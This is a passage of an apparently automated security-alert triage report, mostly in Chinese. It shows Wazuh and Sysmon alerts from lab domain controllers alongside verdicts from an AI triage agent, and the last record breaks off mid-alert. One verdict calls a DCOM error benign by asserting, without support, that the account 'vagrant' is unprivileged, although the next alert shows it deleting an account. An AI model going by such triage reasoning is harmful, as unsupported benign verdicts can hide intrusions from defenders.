+  "raw": "{\"@timestamp\": \"2026-07-21T10:12:24.412Z\", \"log\": {\"offset\": 94893854, \"file\": {\"path\": \"/logs/wazuh/alerts.json\"}}, \"log_source\": \"wazuh\", \"host\": {\"name\": \"f8e24743dcc1\"}, \"id\": \"1784628741.171031408\", \"decoder\": {\"name\": \"windows_eventchannel\"}, \"ecs\": {\"version\": \"1.12.0\"}, \"agent\": {\"id\": \"003\", \"name\": \"kingslanding\", \"ip\": \"x.x.x.10\", \"hostname\": \"f8e24743dcc1\", \"ephemeral_id\": \"d5d271ec-e831-42dd-9d03-45d8ccd7a05b\", \"type\": \"filebeat\", \"version\": \"7.17.22\"}, \"data\": {\"win\": {\"system\": {\"task\": \"11\", \"severityValue\": \"INFORMATION\", \"version\": \"2\", \"systemTime\": \"2026-07-21T10:12:20.787545000Z\", \"providerName\": \"Microsoft-Windows-Sysmon\", \"providerGuid\": \"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\", \"opcode\": \"0\", \"eventID\": \"11\", \"processID\": \"964\", \"channel\": \"Microsoft-Windows-Sysmon/Operational\", \"level\": \"4\", \"computer\": \"kingslanding.sevenkingdoms.local\", \"message\": \"\\\"File created:\\r\\nRuleName: -\\r\\nUtcTime: 2026-07-21 10:12:20.780\\r\\nProcessGuid: {5d3417cb-4603-6a5f-3d10-000000000f00}\\r\\nProcessId: 5032\\r\\nImage: C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\\r\\nTargetFilename: C:\\\\Windows\\\\Temp\\\\__PSScriptPolicyTest_2zkotrqc.5kd.ps1\\r\\nCreationUtcTime: 2026-07-21 10:12:20.780\\r\\nUser: NT AUTHORITY\\\\SYSTEM\\\"\", \"threadID\": \"4024\", \"keywords\": \"0x8000000000000000\", \"eventRecordID\": \"992942\"}, \"eventdata\": {\"user\": \"NT AUTHORITY\\\\\\\\SYSTEM\", \"utcTime\": \"2026-07-21 10:12:20.780\", \"processGuid\": \"{5d3417cb-4603-6a5f-3d10-000000000f00}\", \"processId\": \"5032\", \"image\": \"C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\WindowsPowerShell\\\\\\\\v1.0\\\\\\\\powershell.exe\", \"targetFilename\": \"C:\\\\\\\\Windows\\\\\\\\Temp\\\\\\\\__PSScriptPolicyTest_2zkotrqc.5kd.ps1\", \"creationUtcTime\": \"2026-07-21 10:12:20.780\"}}}, \"location\": \"EventChannel\", \"input\": {\"type\": \"log\"}, \"rule\": {\"firedtimes\": 3, \"mail\": false, \"groups\": [\"sysmon\", \"sysmon_eid11_detections\", \"windows\"], \"level\": 9, \"description\": \"C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\WindowsPowerShell\\\\\\\\v1.0\\\\\\\\powershell.exe created a new scripting file under Windows Temp or User data folder\", \"id\": \"92201\", \"mitre\": {\"id\": [\"T1105\", \"T1059\"], \"tactic\": [\"Command and Control\", \"Execution\"], \"technique\": [\"Ingress Tool Transfer\", \"Command and Scripting Interpreter\"]}}, \"log_type\": \"hids_alert\", \"manager\": {\"name\": \"e5bb7343f06d\"}, \"timestamp\": \"2026-07-21T10:12:21.783+0000\"}",
+  "arrival_ms": 1784628744412,
+  "technique_ids": [
+    "T1105",
+    "T1059"
+  ],
+  "source": "wazuh",
+  "rule_id": "92201",
+  "stream": "soc-hids-alert-*",
+  "alert_uid": "cc254e6282018ffddb70227acf12e4bd27f8a4c4e295306e95cbe2fbefaebf19",
+  "rule_description": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe created a new scripting file under Windows Temp or User data folder",
+  "sensor": "wazuh-hids",
+  "raw_ref": "soc-hids-alert-2026.07.21:Y0IphJ8B3gPM8FAelFrH",
+  "time": "2026-07-21T10:12:21.783+0000"
+}
+
+### ② 触发上下文(seed:触发事件 / 主语 / 宾语 / 次要实体)
+{
+  "event": {
+    "creation_time": "2026-07-21 10:12:20.780",
+    "ingest_time": 1784628906578,
+    "stream": "winlogbeat-*",
+    "event_code": "11",
+    "arrival_ms": 1784628742717,
+    "raw_ref": "soc-hids-alert-2026.07.21:Y0IphJ8B3gPM8FAelFrH",
+    "sensor": "Microsoft-Windows-Sysmon/Operational",
+    "source": "winlogbeat",
+    "event_time": "2026-07-21T10:12:20.787545000Z",
+    "event_uid": "6cb346cce0073514bb400c123ff64d2a03712fbddc8b2f8a391fcfb0e93b190a"
+  },
+  "subject": {
+    "_labels": [
+      "Process"
+    ],
+    "image": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe",
+    "first_seen": "2026-07-21T10:12:19.869Z",
+    "process_guid": "{5d3417cb-4603-6a5f-3d10-000000000f00}",
+    "last_seen": "2026-07-21T10:12:20.787Z",
+    "hashes": "MD5=7353F60B1739074EB17C5F4DDDEFE239,SHA256=DE96A6E69944335375DC1AC238336066889D9FFC7D73628EF4FE1B1B160AB32C,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F",
+    "pid": "5032",
+    "command_line": "powershell.exe -ExecutionPolicy Restricted -Command $res = 0; if(get-vmswitch | Where {$_.NetAdapterInterfaceDescription -ne $null -and $_.NetAdapterInterfaceDescription -eq (Get-NetLbfoTeamNic).InterfaceDescription}){$res=1}; Write-Host \"Final result:\", $res"
+  },
+  "related": [
+    {
+      "node": {
+        "_labels": [
+          "File"
+        ],
+        "path": "C:\\\\Windows\\\\Temp\\\\__PSScriptPolicyTest_2zkotrqc.5kd.ps1",
+        "first_seen": "2026-07-21T10:12:20.787545000Z",
+        "last_seen": "2026-07-21T10:12:20.787545000Z",
+        "host": "kingslanding.sevenkingdoms.local"
+      },
+      "rel": "WROTE"
+    },
+    {
+      "node": {
+        "_labels": [
+          "File"
+        ],
+        "path": "C:\\Windows\\Temp\\__PSScriptPolicyTest_2zkotrqc.5kd.ps1",
+        "first_seen": "2026-07-21T10:12:20.787Z",
+        "last_seen": "2026-07-21T10:12:20.787Z",
+        "host": "kingslanding.sevenkingdoms.local"
+      },
+      "rel": "WROTE"
+    },
+    {
+      "node": {
+        "_labels": [
+          "Host"
+        ],
+        "hostname": "kingslanding.sevenkingdoms.local",
+        "role": "domain_controller",
+        "first_seen": "2026-07-02T02:32:09.289Z",
+        "has_adcs": true,
+        "last_seen": "2026-07-22T03:46:06.476Z",
+        "domain": "sevenkingdoms.local",
+        "criticality": "critical",
+        "is_dc": true
+      },
+      "rel": "ON_HOST"
+    }
+  ]
+}
+
+### ③ 研判   [skill] suspicious_process   [模式] recipe
+# 研判留痕(9 步)
+[1] recipe取证「触发事件」→ 1 行
+[2] recipe取证「主语进程」→ 1 行
+[3] recipe取证「落地文件」→ 2 行
+[4] recipe取证「子进程(含命令行)」→ 0 行
+[5] recipe取证「主机」→ 1 行
+[6] recipe取证「供给/自检噪声」→ 1 行
+[7] recipe取证「父进程」→ 1 行
+[8] recipe取证「子进程后续行为」→ 1 行
+[9] recipe取证「_图盲区」→ 1 行
+
+# 研判结果  alert=cc254e6282018ffddb70227acf12e4bd27f8a4c4e295306e95cbe2fbefaebf19  path=B  skill=suspicious_process
+verdict   : false_positive  (confidence=0.95)
+summary   : PowerShell 执行策略自检(PS Script Policy Test)产生的临时脚本文件，属于系统良性行为。
+rationale : 证据明确标记为'ps_execution_policy_probe'，即 PowerShell 执行策略自检。这是 Windows 系统自动生成的行为，用于验证脚本执行策略，非攻击行为。文件名特征__PSScriptPolicyTest_... 与证据一致。
+evidence  : ['cc254e6282018ffddb70227acf12e4bd27f8a4c4e295306e95cbe2fbefaebf19', '__PSScriptPolicyTest_2zkotrqc.5kd.ps1', 'ps_execution_policy_probe']
+agent     : qwen3.5-9b
+处置(建议): 无
+
+============================================================================
+## [9/10] technique=(none)   该类共 100 条   uid=05313449906b1f6710b349c71b6e624ba8117961f8f3de164e7f701aca1d2f8d
+============================================================================
+### ① 原始告警节点(:Alert)
+{
+  "severity": 10,
+  "first_seen": "2026-07-16T06:20:14.525272000Z",
+  "last_seen": "2026-07-16T06:20:14.525272000Z",
+  "raw": "{\"@timestamp\": \"2026-07-16T06:20:17.032Z\", \"ecs\": {\"version\": \"1.12.0\"}, \"previous_output\": \"{\\\"win\\\":{\\\"system\\\":{\\\"providerName\\\":\\\"Microsoft-Windows-DistributedCOM\\\",\\\"providerGuid\\\":\\\"{1B562E86-B7AA-4131-BADC-B6F3A001407E}\\\",\\\"eventSourceName\\\":\\\"DCOM\\\",\\\"eventID\\\":\\\"10016\\\",\\\"version\\\":\\\"0\\\",\\\"level\\\":\\\"2\\\",\\\"task\\\":\\\"0\\\",\\\"opcode\\\":\\\"0\\\",\\\"keywords\\\":\\\"0x8080000000000000\\\",\\\"systemTime\\\":\\\"2026-07-16T06:20:11.368474700Z\\\",\\\"eventRecordID\\\":\\\"9195\\\",\\\"processID\\\":\\\"772\\\",\\\"threadID\\\":\\\"3536\\\",\\\"channel\\\":\\\"System\\\",\\\"computer\\\":\\\"meereen.essos.local\\\",\\\"severityValue\\\":\\\"ERROR\\\",\\\"message\\\":\\\"\\\\\\\"The application-specific permission settings do not grant Local Activation permission for the COM Server application with CLSID \\\\r\\\\n{D63B10C5-BB46-4990-A94F-E40B9D520160}\\\\r\\\\n and APPID \\\\r\\\\n{9CA88EE3-ACB7-47C8-AFC4-AB702511C276}\\\\r\\\\n to the user ESSOS\\\\\\\\vagrant SID (S-1-5-21-4206617935-2580949811-1114734249-1000) from address LocalHost (Using LRPC) running in the application container Unavailable SID (Unavailable). This security permission can be modified using the Component Services administrative tool.\\\\\\\"\\\"},\\\"eventdata\\\":{\\\"param1\\\":\\\"application-specific\\\",\\\"param2\\\":\\\"Local\\\",\\\"param3\\\":\\\"Activation\\\",\\\"param4\\\":\\\"{D63B10C5-BB46-4990-A94F-E40B9D520160}\\\",\\\"param5\\\":\\\"{9CA88EE3-ACB7-47C8-AFC4-AB702511C276}\\\",\\\"param6\\\":\\\"ESSOS\\\",\\\"param7\\\":\\\"vagrant\\\",\\\"param8\\\":\\\"S-1-5-21-4206617935-2580949811-1114734249-1000\\\",\\\"param9\\\":\\\"LocalHost (Using LRPC)\\\",\\\"param10\\\":\\\"Unavailable\\\",\\\"param11\\\":\\\"Unavailable\\\"}}}\\n{\\\"win\\\":{\\\"system\\\":{\\\"providerName\\\":\\\"Microsoft-Windows-DistributedCOM\\\",\\\"providerGuid\\\":\\\"{1B562E86-B7AA-4131-BADC-B6F3A001407E}\\\",\\\"eventSourceName\\\":\\\"DCOM\\\",\\\"eventID\\\":\\\"10016\\\",\\\"version\\\":\\\"0\\\",\\\"level\\\":\\\"2\\\",\\\"task\\\":\\\"0\\\",\\\"opcode\\\":\\\"0\\\",\\\"keywords\\\":\\\"0x8080000000000000\\\",\\\"systemTime\\\":\\\"2026-07-16T06:20:08.323423400Z\\\",\\\"eventRecordID\\\":\\\"9194\\\",\\\"processID\\\":\\\"772\\\",\\\"threadID\\\":\\\"3536\\\",\\\"channel\\\":\\\"System\\\",\\\"computer\\\":\\\"meereen.essos.local\\\",\\\"severityValue\\\":\\\"ERROR\\\",\\\"message\\\":\\\"\\\\\\\"The application-specific permission settings do not grant Local Activation permission for the COM Server application with CLSID \\\\r\\\\n{D63B10C5-BB46-4990-A94F-E40B9D520160}\\\\r\\\\n and APPID \\\\r\\\\n{9CA88EE3-ACB7-47C8-AFC4-AB702511C276}\\\\r\\\\n to the user ESSOS\\\\\\\\vagrant SID (S-1-5-21-4206617935-2580949811-1114734249-1000) from address LocalHost (Using LRPC) running in the application container Unavailable SID (Unavailable). This security permission can be modified using the Component Services administrative tool.\\\\\\\"\\\"},\\\"eventdata\\\":{\\\"param1\\\":\\\"application-specific\\\",\\\"param2\\\":\\\"Local\\\",\\\"param3\\\":\\\"Activation\\\",\\\"param4\\\":\\\"{D63B10C5-BB46-4990-A94F-E40B9D520160}\\\",\\\"param5\\\":\\\"{9CA88EE3-ACB7-47C8-AFC4-AB702511C276}\\\",\\\"param6\\\":\\\"ESSOS\\\",\\\"param7\\\":\\\"vagrant\\\",\\\"param8\\\":\\\"S-1-5-21-4206617935-2580949811-1114734249-1000\\\",\\\"param9\\\":\\\"LocalHost (Using LRPC)\\\",\\\"param10\\\":\\\"Unavailable\\\",\\\"param11\\\":\\\"Unavailable\\\"}}}\\n{\\\"win\\\":{\\\"system\\\":{\\\"providerName\\\":\\\"Microsoft-Windows-DistributedCOM\\\",\\\"providerGuid\\\":\\\"{1B562E86-B7AA-4131-BADC-B6F3A001407E}\\\",\\\"eventSourceName\\\":\\\"DCOM\\\",\\\"eventID\\\":\\\"10016\\\",\\\"version\\\":\\\"0\\\",\\\"level\\\":\\\"2\\\",\\\"task\\\":\\\"0\\\",\\\"opcode\\\":\\\"0\\\",\\\"keywords\\\":\\\"0x8080000000000000\\\",\\\"systemTime\\\":\\\"2026-07-16T06:20:05.009492700Z\\\",\\\"eventRecordID\\\":\\\"9193\\\",\\\"processID\\\":\\\"772\\\",\\\"threadID\\\":\\\"3868\\\",\\\"channel\\\":\\\"System\\\",\\\"computer\\\":\\\"meereen.essos.local\\\",\\\"severityValue\\\":\\\"ERROR\\\",\\\"message\\\":\\\"\\\\\\\"The application-specific permission settings do not grant Local Activation permission for the COM Server application with CLSID \\\\r\\\\n{D63B10C5-BB46-4990-A94F-E40B9D520160}\\\\r\\\\n and APPID \\\\r\\\\n{9CA88EE3-ACB7-47C8-AFC4-AB702511C276}\\\\r\\\\n to the user ESSOS\\\\\\\\vagrant SID (S-1-5-21-4206617935-2580949811-1114734249-1000) from address LocalHost (Using LRPC) running in the application container Unavailable SID (Unavailable). This security permission can be modified using the Component Services administrative tool.\\\\\\\"\\\"},\\\"eventdata\\\":{\\\"param1\\\":\\\"application-specific\\\",\\\"param2\\\":\\\"Local\\\",\\\"param3\\\":\\\"Activation\\\",\\\"param4\\\":\\\"{D63B10C5-BB46-4990-A94F-E40B9D520160}\\\",\\\"param5\\\":\\\"{9CA88EE3-ACB7-47C8-AFC4-AB702511C276}\\\",\\\"param6\\\":\\\"ESSOS\\\",\\\"param7\\\":\\\"vagrant\\\",\\\"param8\\\":\\\"S-1-5-21-4206617935-2580949811-1114734249-1000\\\",\\\"param9\\\":\\\"LocalHost (Using LRPC)\\\",\\\"param10\\\":\\\"Unavailable\\\",\\\"param11\\\":\\\"Unavailable\\\"}}}\\n{\\\"win\\\":{\\\"system\\\":{\\\"providerName\\\":\\\"Microsoft-Windows-DistributedCOM\\\",\\\"providerGuid\\\":\\\"{1B562E86-B7AA-4131-BADC-B6F3A001407E}\\\",\\\"eventSourceName\\\":\\\"DCOM\\\",\\\"eventID\\\":\\\"10016\\\",\\\"version\\\":\\\"0\\\",\\\"level\\\":\\\"2\\\",\\\"task\\\":\\\"0\\\",\\\"opcode\\\":\\\"0\\\",\\\"keywords\\\":\\\"0x8080000000000000\\\",\\\"systemTime\\\":\\\"2026-07-16T06:20:01.802640800Z\\\",\\\"eventRecordID\\\":\\\"9192\\\",\\\"processID\\\":\\\"772\\\",\\\"threadID\\\":\\\"2748\\\",\\\"channel\\\":\\\"System\\\",\\\"computer\\\":\\\"meereen.essos.local\\\",\\\"severityValue\\\":\\\"ERROR\\\",\\\"message\\\":\\\"\\\\\\\"The application-specific permission settings do not grant Local Activation permission for the COM Server application with CLSID \\\\r\\\\n{D63B10C5-BB46-4990-A94F-E40B9D520160}\\\\r\\\\n and APPID \\\\r\\\\n{9CA88EE3-ACB7-47C8-AFC4-AB702511C276}\\\\r\\\\n to the user ESSOS\\\\\\\\vagrant SID (S-1-5-21-4206617935-2580949811-1114734249-1000) from address LocalHost (Using LRPC) running in the application container Unavailable SID (Unavailable). This security permission can be modified using the Component Services administrative tool.\\\\\\\"\\\"},\\\"eventdata\\\":{\\\"param1\\\":\\\"application-specific\\\",\\\"param2\\\":\\\"Local\\\",\\\"param3\\\":\\\"Activation\\\",\\\"param4\\\":\\\"{D63B10C5-BB46-4990-A94F-E40B9D520160}\\\",\\\"param5\\\":\\\"{9CA88EE3-ACB7-47C8-AFC4-AB702511C276}\\\",\\\"param6\\\":\\\"ESSOS\\\",\\\"param7\\\":\\\"vagrant\\\",\\\"param8\\\":\\\"S-1-5-21-4206617935-2580949811-1114734249-1000\\\",\\\"param9\\\":\\\"LocalHost (Using LRPC)\\\",\\\"param10\\\":\\\"Unavailable\\\",\\\"param11\\\":\\\"Unavailable\\\"}}}\\n{\\\"win\\\":{\\\"system\\\":{\\\"providerName\\\":\\\"Microsoft-Windows-DistributedCOM\\\",\\\"providerGuid\\\":\\\"{1B562E86-B7AA-4131-BADC-B6F3A001407E}\\\",\\\"eventSourceName\\\":\\\"DCOM\\\",\\\"eventID\\\":\\\"10016\\\",\\\"version\\\":\\\"0\\\",\\\"level\\\":\\\"2\\\",\\\"task\\\":\\\"0\\\",\\\"opcode\\\":\\\"0\\\",\\\"keywords\\\":\\\"0x8080000000000000\\\",\\\"systemTime\\\":\\\"2026-07-16T06:19:58.726820100Z\\\",\\\"eventRecordID\\\":\\\"9191\\\",\\\"processID\\\":\\\"772\\\",\\\"threadID\\\":\\\"3868\\\",\\\"channel\\\":\\\"System\\\",\\\"computer\\\":\\\"meereen.essos.local\\\",\\\"severityValue\\\":\\\"ERROR\\\",\\\"message\\\":\\\"\\\\\\\"The application-specific permission settings do not grant Local Activation permission for the COM Server application with CLSID \\\\r\\\\n{D63B10C5-BB46-4990-A94F-E40B9D520160}\\\\r\\\\n and APPID \\\\r\\\\n{9CA88EE3-ACB7-47C8-AFC4-AB702511C276}\\\\r\\\\n to the user ESSOS\\\\\\\\vagrant SID (S-1-5-21-4206617935-2580949811-1114734249-1000) from address LocalHost (Using LRPC) running in the application container Unavailable SID (Unavailable). This security permission can be modified using the Component Services administrative tool.\\\\\\\"\\\"},\\\"eventdata\\\":{\\\"param1\\\":\\\"application-specific\\\",\\\"param2\\\":\\\"Local\\\",\\\"param3\\\":\\\"Activation\\\",\\\"param4\\\":\\\"{D63B10C5-BB46-4990-A94F-E40B9D520160}\\\",\\\"param5\\\":\\\"{9CA88EE3-ACB7-47C8-AFC4-AB702511C276}\\\",\\\"param6\\\":\\\"ESSOS\\\",\\\"param7\\\":\\\"vagrant\\\",\\\"param8\\\":\\\"S-1-5-21-4206617935-2580949811-1114734249-1000\\\",\\\"param9\\\":\\\"LocalHost (Using LRPC)\\\",\\\"param10\\\":\\\"Unavailable\\\",\\\"param11\\\":\\\"Unavailable\\\"}}}\\n{\\\"win\\\":{\\\"system\\\":{\\\"providerName\\\":\\\"Microsoft-Windows-DistributedCOM\\\",\\\"providerGuid\\\":\\\"{1B562E86-B7AA-4131-BADC-B6F3A001407E}\\\",\\\"eventSourceName\\\":\\\"DCOM\\\",\\\"eventID\\\":\\\"10016\\\",\\\"version\\\":\\\"0\\\",\\\"level\\\":\\\"2\\\",\\\"task\\\":\\\"0\\\",\\\"opcode\\\":\\\"0\\\",\\\"keywords\\\":\\\"0x8080000000000000\\\",\\\"systemTime\\\":\\\"2026-07-16T06:19:55.584712500Z\\\",\\\"eventRecordID\\\":\\\"9190\\\",\\\"processID\\\":\\\"772\\\",\\\"threadID\\\":\\\"564\\\",\\\"channel\\\":\\\"System\\\",\\\"computer\\\":\\\"meereen.essos.local\\\",\\\"severityValue\\\":\\\"ERROR\\\",\\\"message\\\":\\\"\\\\\\\"The application-specific permission settings do not grant Local Activation permission for the COM Server application with CLSID \\\\r\\\\n{D63B10C5-BB46-4990-A94F-E40B9D520160}\\\\r\\\\n and APPID \\\\r\\\\n{9CA88EE3-ACB7-47C8-AFC4-AB702511C276}\\\\r\\\\n to the user ESSOS\\\\\\\\vagrant SID (S-1-5-21-4206617935-2580949811-1114734249-1000) from address LocalHost (Using LRPC) running in the application container Unavailable SID (Unavailable). This security permission can be modified using the Component Services administrative tool.\\\\\\\"\\\"},\\\"eventdata\\\":{\\\"param1\\\":\\\"application-specific\\\",\\\"param2\\\":\\\"Local\\\",\\\"param3\\\":\\\"Activation\\\",\\\"param4\\\":\\\"{D63B10C5-BB46-4990-A94F-E40B9D520160}\\\",\\\"param5\\\":\\\"{9CA88EE3-ACB7-47C8-AFC4-AB702511C276}\\\",\\\"param6\\\":\\\"ESSOS\\\",\\\"param7\\\":\\\"vagrant\\\",\\\"param8\\\":\\\"S-1-5-21-4206617935-2580949811-1114734249-1000\\\",\\\"param9\\\":\\\"LocalHost (Using LRPC)\\\",\\\"param10\\\":\\\"Unavailable\\\",\\\"param11\\\":\\\"Unavailable\\\"}}}\\n{\\\"win\\\":{\\\"system\\\":{\\\"providerName\\\":\\\"Microsoft-Windows-DistributedCOM\\\",\\\"providerGuid\\\":\\\"{1B562E86-B7AA-4131-BADC-B6F3A001407E}\\\",\\\"eventSourceName\\\":\\\"DCOM\\\",\\\"eventID\\\":\\\"10016\\\",\\\"version\\\":\\\"0\\\",\\\"level\\\":\\\"2\\\",\\\"task\\\":\\\"0\\\",\\\"opcode\\\":\\\"0\\\",\\\"keywords\\\":\\\"0x8080000000000000\\\",\\\"systemTime\\\":\\\"2026-07-16T06:19:52.548826900Z\\\",\\\"eventRecordID\\\":\\\"9189\\\",\\\"processID\\\":\\\"772\\\",\\\"threadID\\\":\\\"564\\\",\\\"channel\\\":\\\"System\\\",\\\"computer\\\":\\\"meereen.essos.local\\\",\\\"severityValue\\\":\\\"ERROR\\\",\\\"message\\\":\\\"\\\\\\\"The application-specific permission settings do not grant Local Activation permission for the COM Server application with CLSID \\\\r\\\\n{D63B10C5-BB46-4990-A94F-E40B9D520160}\\\\r\\\\n and APPID \\\\r\\\\n{9CA88EE3-ACB7-47C8-AFC4-AB702511C276}\\\\r\\\\n to the user ESSOS\\\\\\\\vagrant SID (S-1-5-21-4206617935-2580949811-1114734249-1000) from address LocalHost (Using LRPC) running in the application container Unavailable SID (Unavailable). This security permission can be modified using the Component Services administrative tool.\\\\\\\"\\\"},\\\"eventdata\\\":{\\\"param1\\\":\\\"application-specific\\\",\\\"param2\\\":\\\"Local\\\",\\\"param3\\\":\\\"Activation\\\",\\\"param4\\\":\\\"{D63B10C5-BB46-4990-A94F-E40B9D520160}\\\",\\\"param5\\\":\\\"{9CA88EE3-ACB7-47C8-AFC4-AB702511C276}\\\",\\\"param6\\\":\\\"ESSOS\\\",\\\"param7\\\":\\\"vagrant\\\",\\\"param8\\\":\\\"S-1-5-21-4206617935-2580949811-1114734249-1000\\\",\\\"param9\\\":\\\"LocalHost (Using LRPC)\\\",\\\"param10\\\":\\\"Unavailable\\\",\\\"param11\\\":\\\"Unavailable\\\"}}}\", \"log\": {\"offset\": 65112219, \"file\": {\"path\": \"/logs/wazuh/alerts.json\"}}, \"data\": {\"win\": {\"eventdata\": {\"param11\": \"Unavailable\", \"param1\": \"application-specific\", \"param8\": \"S-1-5-21-4206617935-2580949811-1114734249-1000\", \"param9\": \"LocalHost (Using LRPC)\", \"param2\": \"Local\", \"param4\": \"{D63B10C5-BB46-4990-A94F-E40B9D520160}\", \"param7\": \"vagrant\", \"param3\": \"Activation\", \"param10\": \"Unavailable\", \"param5\": \"{9CA88EE3-ACB7-47C8-AFC4-AB702511C276}\", \"param6\": \"ESSOS\"}, \"system\": {\"providerGuid\": \"{1B562E86-B7AA-4131-BADC-B6F3A001407E}\", \"keywords\": \"0x8080000000000000\", \"level\": \"2\", \"eventSourceName\": \"DCOM\", \"processID\": \"772\", \"eventID\": \"10016\", \"systemTime\": \"2026-07-16T06:20:14.525272000Z\", \"threadID\": \"3868\", \"version\": \"0\", \"severityValue\": \"ERROR\", \"channel\": \"System\", \"computer\": \"meereen.essos.local\", \"opcode\": \"0\", \"providerName\": \"Microsoft-Windows-DistributedCOM\", \"task\": \"0\", \"message\": \"\\\"The application-specific permission settings do not grant Local Activation permission for the COM Server application with CLSID \\r\\n{D63B10C5-BB46-4990-A94F-E40B9D520160}\\r\\n and APPID \\r\\n{9CA88EE3-ACB7-47C8-AFC4-AB702511C276}\\r\\n to the user ESSOS\\\\vagrant SID (S-1-5-21-4206617935-2580949811-1114734249-1000) from address LocalHost (Using LRPC) running in the application container Unavailable SID (Unavailable). This security permission can be modified using the Component Services administrative tool.\\\"\", \"eventRecordID\": \"9196\"}}}, \"log_source\": \"wazuh\", \"decoder\": {\"name\": \"windows_eventchannel\"}, \"timestamp\": \"2026-07-16T06:20:15.954+0000\", \"agent\": {\"ip\": \"x.x.x.12\", \"hostname\": \"f8e24743dcc1\", \"ephemeral_id\": \"d5d271ec-e831-42dd-9d03-45d8ccd7a05b\", \"type\": \"filebeat\", \"version\": \"7.17.22\", \"id\": \"002\", \"name\": \"meereen\"}, \"log_type\": \"hids_alert\", \"rule\": {\"firedtimes\": 3, \"mail\": false, \"groups\": [\"windows\", \"windows_system\"], \"level\": 10, \"description\": \"Multiple System error events\", \"id\": \"61110\", \"frequency\": 8}, \"manager\": {\"name\": \"e5bb7343f06d\"}, \"id\": \"1784182815.117313379\", \"location\": \"EventChannel\", \"input\": {\"type\": \"log\"}, \"host\": {\"name\": \"f8e24743dcc1\"}}",
+  "arrival_ms": 1784182817032,
+  "source": "wazuh",
+  "rule_id": "61110",
+  "stream": "soc-hids-alert-*",
+  "alert_uid": "05313449906b1f6710b349c71b6e624ba8117961f8f3de164e7f701aca1d2f8d",
+  "rule_description": "Multiple System error events",
+  "sensor": "wazuh-hids",
+  "raw_ref": "soc-hids-alert-2026.07.16:ciWVaZ8B3gPM8FAeRMX3",
+  "time": "2026-07-16T06:20:15.954+0000"
+}
+
+### ② 触发上下文(seed:触发事件 / 主语 / 宾语 / 次要实体)
+{
+  "event": {
+    "ingest_time": 1784182826911,
+    "event_code": "10016",
+    "sensor": "System",
+    "raw_ref": "soc-hids-alert-2026.07.16:ciWVaZ8B3gPM8FAeRMX3",
+    "source": "winlogbeat",
+    "event_time": "2026-07-16T06:20:14.525272000Z",
+    "event_uid": "3115fc4538ed8b60ceb4a3e805377de947a7358ac463403ff422f74a55faa7b6"
+  },
+  "subject": null,
+  "related": [
+    {
+      "node": {
+        "_labels": [
+          "Host"
+        ],
+        "hostname": "meereen.essos.local",
+        "role": "domain_controller",
+        "first_seen": "2026-07-02T02:32:06.422Z",
+        "has_adcs": true,
+        "last_seen": "2026-07-22T03:46:17.974Z",
+        "domain": "essos.local",
+        "criticality": "critical",
+        "is_dc": true
+      },
+      "rel": "ON_HOST"
+    }
+  ]
+}
+
+### ③ 研判   [skill] generic_host   [模式] recipe
+# 研判留痕(2 步)
+[1] recipe取证「触发事件与主语/主机」→ 1 行
+[2] recipe取证「宾语与次要参与者」→ 1 行
+
+# 研判结果  alert=05313449906b1f6710b349c71b6e624ba8117961f8f3de164e7f701aca1d2f8d  path=B  skill=generic_host
+verdict   : benign  (confidence=0.95)
+summary   : DCOM 本地激活权限拒绝告警，由本地用户 vagrant 触发，属于配置/权限问题而非攻击。
+rationale : 1. 事件来源为 Microsoft-Windows-DistributedCOM (EventID 10016)，明确为本地 (LocalHost/LRPC) 激活请求被拒。2. 请求者为本地用户 ESSOS\vagrant (普通用户)，非特权账号或域控。3. 无横向移动迹象 (无外连、无凭据窃取、无异常进程链)。4. 此类告警通常因 COM 组件权限配置不当或用户未加入必要组导致，属良性误报。
+evidence  : ['event_uid:3115fc4538ed8b60ceb4a3e805377de947a7358ac463403ff422f74a55faa7b6', 'host:meereen.essos.local', 'account:ESSOS\\vagrant', 'event_code:10016']
+agent     : qwen3.5-9b
+处置(建议): 无
+
+============================================================================
+## [10/10] technique=T1098   该类共 22 条   uid=2abe65b1d54dbc8522fc450a08c1aca87fd880bfbe1b94022676bb9afe6dfa12
+============================================================================
+### ① 原始告警节点(:Alert)
+{
+  "severity": 8,
+  "first_seen": "2026-07-16T06:20:16.553278400Z",
+  "last_seen": "2026-07-16T06:20:16.553278400Z",
+  "raw": "{\"@timestamp\": \"2026-07-16T06:20:17.035Z\", \"location\": \"EventChannel\", \"id\": \"1784182816.117378240\", \"rule\": {\"description\": \"User account disabled or deleted\", \"id\": \"60111\", \"pci_dss\": [\"8.1.2\", \"10.2.5\"], \"level\": 8, \"groups\": [\"windows\", \"windows_security\", \"adduser\", \"account_changed\"], \"gdpr\": [\"IV_35.7.d\", \"IV_32.2\"], \"firedtimes\": 4, \"mail\": false, \"hipaa\": [\"164.312.a.2.I\", \"164.312.a.2.II\", \"164.312.b\"], \"gpg13\": [\"7.10\"], \"tsc\": [\"CC6.8\", \"CC7.2\", \"CC7.3\"], \"mitre\": {\"tactic\": [\"Persistence\", \"Impact\"], \"technique\": [\"Account Manipulation\", \"Account Access Removal\"], \"id\": [\"T1098\", \"T1531\"]}, \"nist_800_53\": [\"AC.2\", \"IA.4\", \"AU.14\", \"AC.7\"]}, \"manager\": {\"name\": \"e5bb7343f06d\"}, \"input\": {\"type\": \"log\"}, \"log_source\": \"wazuh\", \"ecs\": {\"version\": \"1.12.0\"}, \"data\": {\"win\": {\"system\": {\"severityValue\": \"AUDIT_SUCCESS\", \"channel\": \"Security\", \"computer\": \"meereen.essos.local\", \"providerName\": \"Microsoft-Windows-Security-Auditing\", \"threadID\": \"3704\", \"processID\": \"548\", \"keywords\": \"0x8020000000000000\", \"systemTime\": \"2026-07-16T06:20:16.553278400Z\", \"level\": \"0\", \"task\": \"13824\", \"opcode\": \"0\", \"eventRecordID\": \"302721\", \"message\": \"\\\"A user account was deleted.\\r\\n\\r\\nSubject:\\r\\n\\tSecurity ID:\\t\\tS-1-5-21-4206617935-2580949811-1114734249-1000\\r\\n\\tAccount Name:\\t\\tvagrant\\r\\n\\tAccount Domain:\\t\\tESSOS\\r\\n\\tLogon ID:\\t\\t0x137DA7D3\\r\\n\\r\\nTarget Account:\\r\\n\\tSecurity 